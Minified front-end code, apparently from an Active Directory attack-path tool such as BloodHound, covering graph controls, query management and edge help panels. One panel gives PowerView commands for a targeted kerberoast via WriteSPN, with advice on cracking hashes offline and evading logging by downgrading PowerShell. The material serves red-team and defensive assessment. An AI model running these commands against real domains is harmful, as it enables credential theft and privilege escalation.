well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."})]}),Cf=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),e.jsx(t,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity."}),e.jsx(t,{variant:"body2",children:"You may be able to completely evade those features by downgrading to PowerShell v2."})]}),kf=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/kerberoasting-revisited/",children:"https://blog.harmj0y.net/redteaming/kerberoasting-revisited/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"})]}),Tf=({sourceName:r,sourceType:a})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as"," ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]}),Pf={general:Af,windowsAbuse:Tf,linuxAbuse:Sf,opsec:Cf,references:kf},Df={GenericAll:Np,MemberOf:Ju,AllExtendedRights:rd,AdminTo:Ql,HasSession:yu,AddMember:Fl,ForceChangePassword:Sp,GenericWrite:Wp,Owns:bm,OwnsLimitedRights:wm,OwnsRaw:Sm,WriteDacl:Wb,WriteOwner:ef,WriteOwnerLimitedRights:sf,WriteOwnerRaw:df,CanRDP:Sd,ExecuteDCOM:pp,AllowedToDelegate:md,CoerceToTGT:hh,GetChanges:Vp,GetChangesAll:eu,ReadLAPSPassword:Wm,Contains:fh,GPLink:Op,AddAllowedToAct:Tl,AllowedToAct:cd,SQLAdmin:Zm,ReadGMSAPassword:Nm,HasSIDHistory:pu,CrossForestTrust:jh,SameForestTrust:nb,SpoofSIDHistory:sb,AbuseTGTDelegation:wl,CanPSRemote:xd,AZAddMembers:So,AZAddSecret:$o,AZAvereContributor:Yo,AZContains:oi,AZContributor:di,AZExecuteCommand:bi,AZGetCertificates:ji,AZGetKeys:Ci,AZGetSecrets:Oi,AZHasRole:_i,AZManagedIdentity:sc,AZMemberOf:pc,AZOwns:vc,AZPrivilegedAuthAdmin:Tc,AZPrivilegedRoleAdmin:Ec,AZResetPassword:Mc,AZUserAccessAdministrator:tl,AZGlobalAdmin:Gi,AZAppAdmin:Fo,AZCloudAppAdmin:ei,AZRunsAs:Qc,AZVMAdminLogin:il,AZVMContributor:hl,WriteSPN:Pf,AddSelf:Kl,AddKeyCredentialLink:Il,DCSync:Eh,SyncLAPSPassword:pb,WriteAccountRestrictions:Nb,WriteGPLink:Vb,DumpSMSAPassword:Bh,AZMGAddMember:ts,AZMGAddOwner:is,AZMGAddSecret:hs,AZMGGrantAppRoles:Rs,AZMGGrantRole:Ns,AZMGAppRoleAssignment_ReadWrite_All:fs,AZMGApplication_ReadWrite_All:ws,AZMGDirectory_ReadWrite_All:ks,AZMGGroupMember_ReadWrite_All:Us,AZMGGroup_ReadWrite_All:zs,AZMGRoleManagement_ReadWrite_Directory:Js,AZMGServicePrincipalEndpoint_ReadWrite_All:rc,AZWebsiteContributor:fl,AZAddOwner:Do,AZAKSContributor:xo,AZAutomationContributor:qo,AZKeyVaultKVContributor:Ki,AZLogicAppContributor:Qi,AZNodeResourceGroup:yc,AZRoleApprover:Uc,AZRoleEligible:Kc,Enroll:Yh,EnterpriseCAFor:sp,RootCAFor:Vm,PublishedTo:Om,NTAuthStoreFor:nm,IssuedSignedBy:$u,TrustedForNTAuth:Ob,HostsCAService:Pu,DelegatedEnrollmentAgent:Lh,EnrollOnBehalfOf:tp,GoldenCert:su,ADCSESC1:ca,ADCSESC4:Ua,ADCSESC3:Ga,ADCSESC6a:Ha,ADCSESC6b:Za,ADCSESC9a:io,ADCSESC9b:mo,ADCSESC10a:ba,ADCSESC10b:va,ADCSESC13:Pa,ManageCA:_u,ManageCertificates:zu,WritePKIEnrollmentFlag:ff,WritePKINameFlag:vf,DCFor:kh,OIDGroupLink:lm,ExtendedByPolicy:gp,SyncedToADUser:gb,SyncedToEntraUser:Sb,CoerceAndRelayNTLMToSMB:oh,CoerceAndRelayNTLMToLDAP:qd,CoerceAndRelayNTLMToLDAPS:Jd,CoerceAndRelayNTLMToADCS:Md,ClaimSpecialIdentity:Dd,HasTrustKeys:vu};function Of({children:r}){const[a,o]=p.useState({query:"",id:void 0}),[i,s]=p.useState(!1),[c,d]=p.useState(void 0),h=ea(a.query,a.id),{setCypherQuery:u,performSearch:m}=Ln(),y={selected:a,selectedQuery:h,saveAction:c,showSaveQueryDialog:i,setSelected:o,setSaveAction:d,setShowSaveQueryDialog:s,runQuery:(b,k)=>{o({query:b,id:k}),u(b),m(b)},editQuery:b=>{o({query:"",id:b}),d("edit"),s(!0)}};return e.jsx(cr.Provider,{value:y,children:r})}const Rf=({id:r,label:a,queryType:o,countLabel:i,sections:s,parentLabels:c=[]})=>{var G,F;const{setExploreParams:d,expandedPanelSections:h}=le(),u=o?ct[o]:void 0,m=h.includes(a),j=ae(["relatedCount",a,r],()=>u?u({id:r,skip:0,limit:128}):s?Promise.all(s.map(f=>{const x=f.queryType?ct[f.queryType]:void 0;return x?x({id:r,skip:0,limit:128}):Promise.resolve()})):Promise.reject("Invalid call data provided for relationship list query"),{refetchOnWindowFocus:!1,retry:!1}),v=((G=j.data)==null?void 0:G.count)<lr,y=()=>{d({expandedPanelSections:c})},b=()=>{const f=[...c,a];d({expandedPanelSections:f})},k=()=>{const f=[...c,a];d({expandedPanelSections:f,...v&&{searchType:"relationship",relationshipQueryType:o,relationshipQueryItemId:r}})},A=f=>{f?S():y()},S=async()=>{u?k():b()},C=f=>{d({primarySearch:f.id,searchType:"node",exploreSearchTab:"node"})},T=f=>{C(f)};let R;return Array.isArray(j.data)?i!==void 0?j.data.forEach(f=>{f.countLabel===i&&(R=f.count)}):R=j.data.reduce((f,x)=>{const D=(x==null?void 0:x.count)??0;return f+D},0):j.data&&(R=((F=j.data)==null?void 0:F.count)??0),e.jsxs(wn,{label:a,count:R,isExpanded:m,isLoading:j.isLoading,isError:j.isError,error:j.error,onChange:A,children:[u&&e.jsx(dr,{itemCount:R,fetchDataCallback:f=>u({id:r,...f}),onClick:T}),s&&s.map((f,x)=>p.createElement(Rf,{...f,"data-testid":"entity-info-data-table-graphed",key:x,parentLabels:[...c,a]}))]})},We=({children:r,label:a})=>{const[o,i]=p.useState(null),s=!!o,c=()=>i(null);return e.jsxs(e.Fragment,{children:[e.jsx(Ke,{"aria-label":a,"data-testid":`explore_graph-controls_${a.toLowerCase().split(" ").join("-")}-menu`,onClick:d=>{i(d.currentTarget)},"aria-controls":s?`${a}-menu`:void 0,"aria-haspopup":"true","aria-expanded":s?"true":void 0,displayText:a}),e.jsx(hr,{id:`${a}-menu`,open:s,anchorEl:o,onClose:c,MenuListProps:{"aria-labelledby":`${a}-button`},anchorOrigin:{vertical:"top",horizontal:"left"},transformOrigin:{vertical:"bottom",horizontal:"left"},children:p.Children.map(r,d=>e.jsx("div",{onClick:c,children:d}))})]})},Ef="Search node in results",If="No result found in current results",jt=38,Be=350,$f=({sx:r,currentNodes:a,onSelect:o,onClose:i})=>{const s=p.useRef(null),[c,d]=p.useState([]),h=Object.entries(a).map(([S,C])=>"objectId"in C?{id:S,...C}:"data"in C?{id:S,objectId:C.data.objectid,label:C.label.text,kind:C.data.nodetype||C.data.kind||C.data.primaryKind}:{id:S,objectId:"",label:"unknown",kind:"unknown"});let u=jt*c.length;u>Be&&(u=Be-10),pr(s,i);const{getInputProps:m,getMenuProps:j,getComboboxProps:v,getItemProps:y,inputValue:b,highlightedIndex:k}=ur({items:c,onInputValueChange:({inputValue:S})=>{const C=h.filter(T=>{var f,x;const R=((f=T.label)==null?void 0:f.toLowerCase())||"",G=((x=T.objectId)==null?void 0:x.toLowerCase())||"",F=(S==null?void 0:S.toLowerCase())||"";return S===""?!1:R.includes(F)||G.includes(F)});d(C)},itemToString:S=>(S==null?void 0:S.label)??"",onSelectedItemChange:({selectedItem:S})=>{S&&o(S)}}),A=({index:S,style:C})=>e.jsx(Dn,{style:C,item:c[S],index:S,highlightedIndex:k,keyword:b,getItemProps:y},c[S].id);return e.jsx("div",{ref:s,children:e.jsxs(l,{component:ze,...r,...v(),children:[e.jsx(l,{overflow:"auto",maxHeight:Be,marginBottom:c.length===0?0:1,children:e.jsxs(B,{"data-testid":"current-results-list",dense:!0,...j({hidden:c.length===0&&!b,style:{paddingTop:0}}),children:[e.jsx(mr,{height:u,width:"100%",itemSize:jt,itemCount:c.length,children:A}),c.length===0&&b&&e.jsx(P,{disabled:!0,sx:{fontSize:14},children:If})]})}),e.jsx(br,{autoFocus:!0,placeholder:Ef,variant:"outlined",size:"small",fullWidth:!0,...m(),InputProps:{sx:{fontSize:14}}})]})})},Ay=()=>{const r=we();return e.jsx(l,{display:"flex",justifyContent:"center",mt:r.spacing(8),mx:r.spacing(4),children:e.jsxs(K,{severity:"error",children:[e.jsx(At,{children:"WebGL Not Supported"}),e.jsx("p",{children:"This page requires WebGL to render. Please enable WebGL in your browser settings or switch to a browser that supports this feature."})]})})};function Sy(r){const{onReset:a,onLayoutChange:o,onToggleNodeLabels:i,onToggleEdgeLabels:s,onSearchedNodeClick:c,isExploreTableSelected:d,layoutOptions:h,selectedLayout:u,showNodeLabels:m,showEdgeLabels:j,jsonData:v,currentNodes:y={}}=r,{searchType:b}=le(),[k,A]=p.useState(!1),S=p.useRef(null),C=()=>{m&&j?(i(),s()):(m||i(),j||s())};return e.jsxs(e.Fragment,{children:[e.jsxs("div",{"data-testid":"explore_graph-controls",className:"flex gap-1 pointer-events-auto",ref:S,children:[e.jsx(fr,{children:e.jsxs(yr,{children:[e.jsx(gr,{className:"pointer-events-auto",children:e.jsx("div",{children:e.jsx(Ke,{"aria-label":"Reset Graph",onClick:a,displayText:e.jsx(oe,{"aria-label":"reset graph view",icon:xr}),"data-testid":"explore_graph-controls_reset-button"})})}),e.jsx(jr,{children:e.jsx(wr,{className:"dark:bg-neutral-dark-5 border-0",children:e.jsx("span",{children:"Reset Graph"})})})]})}),e.jsxs(We,{label:"Hide Labels",children:[e.jsxs(Q,{"aria-label":"All Labels Toggle","data-testid":"explore_graph-controls_all-labels-toggle",onClick:C,children:[!m||!j?"Show":"Hide"," All Labels"]}),e.jsxs(Q,{"aria-label":"Node Labels Toggle","data-testid":"explore_graph-controls_node-labels-toggle",onClick:i,children:[m?"Hide":"Show"," Node Labels"]}),e.jsxs(Q,{"aria-label":"Edge Labels Toggle","data-testid":"explore_graph-controls_edge-labels-toggle",onClick:s,children:[j?"Hide":"Show"," Edge Labels"]})]}),e.jsx(We,{label:"Layout",children:h.map(T=>{const G=d&&b==="cypher"?T==="table":T===u;return e.jsx(Q,{"data-testid":`explore_graph-controls_${T}-buttonLabel`,selected:G,onClick:()=>o(T),children:Pn(T)},T)})}),e.jsx(We,{label:"Export",children:e.jsx(Q,{onClick:()=>Mn(v),disabled:qe(v),children:"JSON"})}),e.jsx(Ke,{"aria-label":"Search node in results",onClick:()=>A(!0),displayText:"Search",disabled:k,"data-testid":"explore_graph-controls_search-current-results"})]}),e.jsx(vr,{open:k,anchorEl:S.current,placement:"top",disablePortal:!0,className:"w-[90%] z-[1]",children:e.jsx("div",{className:"pointer-events-auto","data-testid":"explore_graph-controls_search-current-nodes-popper",children:e.jsx($f,{sx:{padding:1,marginBottom:1},currentNodes:y,onSelect:T=>{c(T),A(!1)},onClose:()=>A(!1)})})})]})}const Gf="An ACE granting access permissions to a Domain, OU, or Container can be inherited by entities contained within them. This panel lists the source object(s) for the inherited ACE.",Nf=({sourceDBId:r,targetDBId:a,edgeName:o,inheritanceHash:i})=>{const{isLoading:s,isError:c,nodesArray:d}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.aclInheritance},{withProperties:!0}),h=j=>{var y;const v=(y=j.properties)==null?void 0:y[Ce.InheritanceHashes];return!!(Array.isArray(v)&&v.includes(i))},u=i.length>0?d.filter(h):[],m=()=>s?e.jsx(H,{variant:"rounded"}):c?e.jsx(K,{severity:"error",children:"Couldn't load ACL inheritance sources"}):u.length===0?e.jsx(K,{severity:"warning",children:"No valid ACL inheritance sources found"}):e.jsx(X,{nodes:u});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:Gf}),e.jsx(l,{py:1,children:m()})]})},Xe=({children:r,label:a="",isExpanded:o,onChange:i=()=>{}})=>{const s=Ar();return e.jsxs(vn,{expanded:o,onChange:(c,d)=>{i(d)},TransitionProps:{unmountOnExit:!0},className:s.accordionRoot,children:[e.jsx(An,{"data-testid":`${a.toLocaleLowerCase()}-accordion`,expandIcon:e.jsx(oe,{icon:o?Cr:kr}),className:"accordion-summary",classes:{root:s.accordionSummary,expandIconWrapper:s.expandIcon},children:e.jsx(Sr,{label:a})}),e.jsx(Sn,{className:s.edgeAccordionDetails,children:r})]})},Mf=(r,a,o)=>`MATCH (s)-[r:${o}]->(t) WHERE ID(s) = ${r} AND ID(t) = ${a} RETURN r LIMIT 1`,Lf=({selectedEdge:r})=>{var y;const{isObjectInfoPanelOpen:a,setIsObjectInfoPanelOpen:o}=St(),i=Cn(r.id);p.useEffect(()=>{i!==r.id&&o(!0)},[i,r.id,o]);const{data:s,isLoading:c,isError:d}=ae([r.id],({signal:b})=>q.cypherSearch(Mf(r.sourceNode.id,r.targetNode.id,r.name),{signal:b},!0).then(k=>k.data.data?k.data.data:{nodes:{},edges:[]}));if(c)return e.jsx(H,{variant:"rectangular",sx:{}});const h={label:"Source Node:",value:r.sourceNode.name},u={label:"Target Node:",value:r.targetNode.name};let m=[h,u];d||(m=[...m,...Tr({...((y=s.edges[0])==null?void 0:y.properties)||{}})]);const j="Relationship Information",v=()=>{o(!a)};return e.jsx(Xe,{isExpanded:a,onChange:v,label:j,children:e.jsx(Pr,{children:e.jsx(Dr,{fields:m})})})},Ff=({selectedEdge:r})=>{const a=we(),{setExploreParams:o,expandedPanelSections:i}=le(),s=Df[r.name],{sourceNode:c,targetNode:d}=r,{objectId:h,type:u}=d,{entityProperties:m}=kn({objectId:h,nodeType:u}),j=()=>{o({expandedPanelSections:[]})},v=!!(r.data[Ce.IsACL]&&r.data[Or.IsInherited]&&typeof r.data[Ce.InheritanceHash]=="string"&&r.data[Ce.InheritanceHash].length>0),y=(k,A)=>{const S=k[1],C=k[0],T=i.includes(C),R=()=>{o({expandedPanelSections:[C],...C==="composition"&&{searchType:"composition",relationshipQueryItemId:r.id}})},G=F=>{F?R():j()};return e.jsxs(p.Fragment,{children:[e.jsx(l,{padding:1,children:e.jsx(Re,{})}),e.jsx(Xe,{label:Rr[C],isExpanded:T,onChange:G,children:e.jsx(S,{edgeName:r.name,sourceDBId:c.id,sourceName:c.name,sourceType:c.type,targetDBId:d.id,targetName:d.name,targetType:d.type,targetId:d.objectId,haslaps:!!(m!=null&&m.haslaps)})})]},A)},b=()=>{const k=i.includes("aclinheritance"),A=()=>{o({expandedPanelSections:["aclinheritance"],searchType:"aclinheritance",relationshipQueryItemId:r.id})},S=T=>{T?A():j()},C=T=>typeof T=="string"?parseInt(T):T;return e.jsxs(p.Fragment,{children:[e.jsx(l,{padding:1,children:e.jsx(Re,{})}),e.jsx(Xe,{label:"ACE Inherited From",isExpanded:k,onChange:S,children:e.jsx(Nf,{edgeName:r.name,sourceDBId:C(c.id),targetDBId:C(d.id),inheritanceHash:r.data[Ce.InheritanceHash]})})]},Object.keys(s).length)};return e.jsxs(l,{children:[e.jsx(Lf,{selectedEdge:r}),s||v?e.jsxs(e.Fragment,{children:[Object.entries(s).map(y),v&&b()]}):e.jsxs(e.Fragment,{children:[e.jsx(l,{padding:1,children:e.jsx(Re,{})}),e.jsx(l,{paddingLeft:a.spacing(1),children:e.jsxs(t,{variant:"body1",fontSize:"0.75rem",children:["The edge"," ",e.jsx(t,{component:"span",variant:"body1",fontWeight:"bold",fontSize:"0.75rem",children:r.name})," ","does not have any additional contextual information at this time."]})})]})]})},_f=({name:r="None Selected"})=>{const a=Er(),{setIsObjectInfoPanelOpen:o}=St(),{setExploreParams:i}=le(),{clearSelectedItem:s,selectedItem:c}=Ir(),d=()=>{o(!1),i({expandedPanelSections:[]})};return e.jsxs("div",{className:a.header,children:[c?e.jsx(lt,{className:a.icon,click:s,tip:"Clear selected item",children:e.jsx(oe,{icon:$r})}):e.jsx("div",{className:"w-3"}),e.jsx(t,{"data-testid":"explore_edge-information-pane_header-text",variant:"h6",noWrap:!0,className:a.headerText,children:r}),e.jsx(lt,{tip:"Collapse All",click:d,className:a.icon,"data-testid":"explore_edge-information-pane_button-collapse-all",children:e.jsx(oe,{icon:Gr})})]})},Uf=({sx:r,selectedEdge:a})=>{const o=Nr();return e.jsxs(l,{sx:r,className:o.container,"data-testid":"explore_edge-information-pane",children:[e.jsx(ze,{elevation:0,classes:{root:o.headerPaperRoot},children:e.jsx(_f,{name:(a==null?void 0:a.name)||"None"})}),e.jsx(ze,{elevation:0,classes:{root:o.contentPaperRoot},children:a===null?"No information to display.":e.jsx(Ff,{selectedEdge:a})})]})},Cy=r=>e.jsx(Tn,{children:e.jsx(Uf,{...r})}),Wf=({open:r,queryId:a,handleClose:o,deleteHandler:i})=>e.jsxs($e,{open:r,onClose:o,maxWidth:"xs",fullWidth:!0,children:[e.jsx(Ze,{children:"Delete Query"}),e.jsx(Ge,{children:e.jsx(Ct,{children:"Are you sure you want to delete this query?"})}),e.jsxs(Ne,{children:[e.jsx(U,{variant:"tertiary",onClick:o,children:"Cancel"}),e.jsx(U,{onClick:()=>{i&&i(a),o()},color:"primary",autoFocus:!0,children:"Confirm"})]})]}),wt=["application/json","application/zip"],Bf=({open:r,onClose:a})=>{const[o,i]=p.useState([]),[s,c]=p.useState(ue.ADD_FILES),[d,h]=p.useState(!1),[u,m]=p.useState(!1),[j,v]=p.useState(""),{addNotification:y}=et(),b=Zn();p.useEffect(()=>{const g=o.filter(_=>_.errors).length>0,I=o.filter(_=>_.status===me.UPLOADING).length>0;m(I);const $=g||!o.length;h($)},[o]);const k=g=>{if(g&&g.length>0){const I=[...g].map($=>wt.includes($.type)?{file:$,status:me.READY}:{file:$,errors:["invalid file type"],status:me.READY});A(I)}},A=g=>{i(I=>[...I,...g])},S=g=>{i(I=>I.filter(($,_)=>_!==g))},C=()=>{s===ue.ADD_FILES&&(c(ue.UPLOAD),x())},T=g=>{i(I=>I.map($=>({...$,status:$.status===me.READY?g:$.status})))},R=(g,I)=>{i($=>$.map(_=>_.file.name===g?{..._,status:I}:_))},G=(g,I)=>{R(g,me.FAILURE),i($=>$.map(_=>_.file.name===g?{..._,errors:[I]}:_))},F=async g=>{var I,$,_;try{return await b.mutateAsync(g.file),R(g.file.name,me.DONE),!0}catch(Y){const ne=(I=Y==null?void 0:Y.response)==null?void 0:I.data;if(($=ne==null?void 0:ne.errors)!=null&&$.length&&((_=ne.errors[0].message)!=null&&_.length)){const{message:ie}=ne.errors[0];y(`Upload failed: ${ie}`,"IngestFileUploadFail"),G(g.file.name,ie)}else y(`File upload failed for ${g.file.name}`,"IngestFileUploadFail"),G(g.file.name,"Upload Failed");return!1}},f=async g=>{try{await F(g),R(g.file.name,me.DONE)}catch(I){console.error(I)}},x=async()=>{var $;T(me.UPLOADING);let g=0;for(const _ of o){if(($=_.errors)!=null&&$.length){g+=1;continue}await F(_)||(g+=1)}g===o.length?y(`${g} files have failed to upload.`,"EndIngestFail"):y(`Successfully uploaded ${o.length-g} files for ingest`,"FileIngestSuccess");const I=g>0?"Some files have failed to upload.":"All files have successfully been uploaded.";v(I)},D=()=>{c(ue.ADD_FILES),i([]),a()};return e.jsx(kt,{open:r,onOpenChange:g=>{g||D()},children:e.jsx(Tt,{children:e.jsxs(Pt,{DialogOverlayProps:{blurBackground:!1},maxWidth:"sm",id:Mr.ImportQueryDialog,children:[e.jsx(Dt,{children:"Upload Files"}),s===ue.ADD_FILES&&e.jsx(Lr,{onDrop:k,disabled:!1,accept:wt}),s===ue.UPLOAD&&j&&e.jsx("div",{className:"text-lg mb-4",children:j}),o.length>0&&e.jsxs(e.Fragment,{children:[e.jsx("div",{children:"Files"}),o.map((g,I)=>e.jsx(Fr,{file:g,onRemove:()=>S(I),onRefresh:()=>f(g),percentCompleted:0},I))]}),e.jsxs(Ot,{className:"flex justify-end gap-4",children:[s===ue.ADD_FILES&&e.jsxs(e.Fragment,{children:[e.jsx(He,{asChild:!0,children:e.jsx(U,{variant:"text",children:"Cancel"})}),e.jsx(U,{variant:"text",onClick:C,disabled:d,children:"Upload"})]}),s===ue.UPLOAD&&e.jsx(He,{asChild:!0,children:e.jsx(U,{variant:"text",disabled:u,children:"Complete"})})]})]})})})},qf=r=>{const{queryFilterHandler:a,exportHandler:o,deleteHandler:i,categories:s,searchTerm:c,platform:d,categoryFilter:h,source:u}=r,{selectedQuery:m}=ve(),[j,v]=p.useState(!1),[y,b]=p.useState(!1),[k,A]=p.useState(!1),S=x=>{a(x,d,h,u)},C=x=>{a(c,x,h,u)},T=x=>{const D=x.target.value,g=typeof D=="string"?D.split(","):D;if(g.includes("")){a(c,d,[],u),v(!1);return}a(c,d,g,u)},R=x=>{a(c,d,h,x)},G=!!(m!=null&&m.id),F=!!(m!=null&&m.id&&(m!=null&&m.canEdit)),f=()=>{A(!0)};return e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"mb-2",children:[e.jsxs("div",{className:"mb-4 flex w-full",children:[e.jsxs("div",{className:"flex-grow relative",children:[e.jsx(Ie,{type:"text",id:"query-search",placeholder:"Search",value:c,className:"w-full bg-transparent dark:bg-transparent rounded-none border-neutral-dark-5 border-t-0 border-x-0",onChange:x=>S(x.target.value)}),e.jsx(ke.MagnifyingGlass,{size:16,className:"absolute right-2 top-[50%] -mt-[8px]"})]}),e.jsxs("div",{className:"flex items-center ml-4",children:[e.jsx(U,{variant:"secondary",size:"medium",onClick:f,children:"Import"}),e.jsx(U,{disabled:!G,className:"ml-2",variant:"secondary",size:"medium",onClick:o,children:"Export"}),e.jsx(U,{"aria-label":"delete",disabled:!F,className:"ml-2",variant:"icon",onClick:()=>i(m==null?void 0:m.id),children:e.jsx(oe,{icon:_r})})]})]}),e.jsxs("div",{className:"flex w-full items-center justify-between flex-row",children:[e.jsxs(Fe,{size:"small",className:"w-full",children:[e.jsx(_e,{id:"platforms-label",children:"Platforms"}),e.jsxs(Ue,{labelId:"platforms-label",id:"demo-simple-select-helper",value:d,label:"Platforms",onChange:x=>C(x.target.value),children:[e.jsx(Q,{value:"",children:"All"}),e.jsx(Q,{value:"Active Directory",children:"Active Directory"}),e.jsx(Q,{value:"Azure",children:"Azure"}),e.jsx(Q,{value:"Saved Queries",children:"Saved Queries"})]})]}),e.jsxs(Fe,{size:"small",className:"w-full ml-2",children:[e.jsx(_e,{id:"category-filter-label",children:"Categories"}),e.jsxs(Ue,{labelId:"category-filter-label",id:"category-filter",value:h,label:"categories",open:j,onOpen:()=>v(!0),onClose:()=>v(!1),multiple:!0,onChange:T,children:[e.jsx(Q,{value:"",children:"All Categories"}),s.map(x=>e.jsx(Q,{value:x,children:x},x))]})]}),e.jsxs(Fe,{size:"small",className:"w-full ml-2",children:[e.jsx(_e,{id:"source-filter-label",children:"Source"}),e.jsxs(Ue,{labelId:"source-filter-label",id:"source-filter",value:u||"",label:"source",open:y,onOpen:()=>b(!0),onClose:()=>b(!1),onChange:x=>R(x.target.value),children:[e.jsx(Q,{value:"",children:"All Sources"}),e.jsx(Q,{value:"prebuilt",children:"Prebuilt"}),e.jsx(Q,{value:"personal",children:"Personal"}),e.jsx(Q,{value:"shared",children:"Shared"})]})]})]})]}),e.jsx(Bf,{open:k,onClose:()=>A(!1)})]})},Kf=({onSetCypherQuery:r,onPerformCypherSearch:a,onToggleCommonQueries:o,showCommonQueries:i})=>{const{selected:s,selectedQuery:c,setSelected:d}=ve(),h=_t(),u=Xn(),{addNotification:m}=et(),[j,v]=p.useState(""),[y,b]=p.useState(""),[k,A]=p.useState(""),[S,C]=p.useState(!1),[T,R]=p.useState(),[G,F]=p.useState([]),f=Ut(),x=f.map(W=>W.subheader),g=[...new Set(x)].filter(W=>W!=="").sort(),[I,$]=p.useState([]),{getSelfId:_}=nt(),{data:Y}=_;p.useEffect(()=>{$(f),he(j,y,G,k)},[h.data]);const ne=(W,se)=>{s.query===W&&s.id===se?(d({query:"",id:void 0}),r(""),a("")):(d({query:W,id:se}),r(W),a(W))},ie=W=>{R(W),C(!0)},Ae=()=>{C(!1),R(void 0)},fe=W=>{u.mutate(W,{onSuccess:()=>{m("Query deleted.","userDeleteQuery"),C(!1),R(void 0)}})},he=(W,se,de,re)=>{v(W),b(se),F(de),A(re);let z=f;const Te=typeof Y=="string"&&Y.length>0;W.length>2&&(z=z.map(L=>({...L,queries:L.queries.filter(te=>{var Pe;return(Pe=te.name)==null?void 0:Pe.toLowerCase().includes(W.toLowerCase())})})).filter(L=>L.queries.length)),se&&(z=z.filter(L=>{var te;return((te=L.category)==null?void 0:te.toLowerCase())===se.toLowerCase()})),de.length&&(z=z.filter(L=>de.includes(L.subheader)).filter(L=>L.queries.length)),re&&re==="prebuilt"?z=z.map(L=>({...L,queries:L.queries.filter(te=>!te.id)})).filter(L=>L.queries.length):re&&re==="personal"?Te?z=z.map(L=>({...L,queries:L.queries.filter(te=>te.user_id===Y)})).filter(L=>L.queries.length):z=[]:re&&re==="shared"&&(Te?z=z.map(L=>({...L,queries:L.queries.filter(te=>te.id&&te.user_id!==Y)})).filter(L=>L.queries.length):z=[]),$(z)},ee=()=>{he("","",[],"")},ye=()=>{c&&(c!=null&&c.id)&&Un(c.id).then(W=>{var de,re;const se=((re=(de=W.headers["content-disposition"])==null?void 0:de.match(/^.*filename="(.*)"$/))==null?void 0:re[1])||"exported_queries.zip";Wr(W.data,se)})};return e.jsxs("div",{className:"flex flex-col h-full",children:[e.jsx("div",{className:"flex items-center",children:e.jsxs(U,{onClick:o,className:"flex justify-start items-center w-full pl-0","data-testid":"common-queries-toggle",variant:"text",children:[e.jsx(oe,{className:"px-2 mr-2",icon:i?Rt:Et}),e.jsx("span",{className:"my-4 font-semibold text-lg",children:"Saved Queries"})]})}),e.jsx("div",{className:ge({hidden:!i}),children:e.jsx(qf,{queryFilterHandler:he,exportHandler:ye,deleteHandler:ie,categories:g,searchTerm:j,platform:y,categoryFilter:G,source:k})}),e.jsx("div",{className:ge("grow-1 min-h-0 overflow-auto",{hidden:!i}),children:e.jsx(Ur,{listSections:I,clickHandler:ne,deleteHandler:ie,clearFiltersHandler:ee,showCommonQueries:i})}),e.jsx(Wf,{open:S,queryId:T,deleteHandler:fe,handleClose:Ae})]})},zf=r=>{const{clearMessage:a,messageState:o}=r,{showMessage:i,message:s}=o,c=p.useRef(void 0),d=p.useCallback(()=>{c.current&&clearTimeout(c.current),c.current=window.setTimeout(()=>{a()},Br)},[a]);return p.useEffect(()=>(i&&d(),()=>{c.current&&clearTimeout(c.current)}),[a,i,d]),e.jsx("div",{className:"w-full pr-1",children:e.jsx("div",{role:"status","aria-live":"polite",className:ge("leading-none opacity-0 scale-90 transition-all duration-300 ease-in-out",{"opacity-100 scale-100 transition-all duration-300 ease-in-out":i}),children:s})})},Hf=({saveAs:r})=>{const a=i=>{i.stopPropagation(),r()};return e.jsxs(It,{children:[e.jsx($t,{className:"inline-flex items-center justify-center whitespace-nowrap rounded-3xl text-sm ring-offset-background transition-colors hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 active:no-underline bg-neutral-light-5 text-neutral-dark-0 shadow-outer-1 hover:bg-secondary hover:text-white h-9 px-4 py-1 text-xs rounded-l-none pl-2 -ml-1 dark:text-neutral-dark-1 